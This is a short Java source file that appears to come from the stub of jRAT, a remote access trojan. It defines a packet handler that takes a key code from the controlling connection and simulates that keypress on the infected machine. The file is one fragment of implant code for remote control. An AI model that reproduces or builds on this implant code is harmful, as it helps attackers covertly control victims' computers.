package se.jrat.stub.packets.incoming;

import se.jrat.common.utils.Utils;
import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet94KeyPress extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = con.readInt();

		if (!Utils.isHeadless()) {
			ScreenUtils.getDefault().keyPress(btn);
		}
	}

}
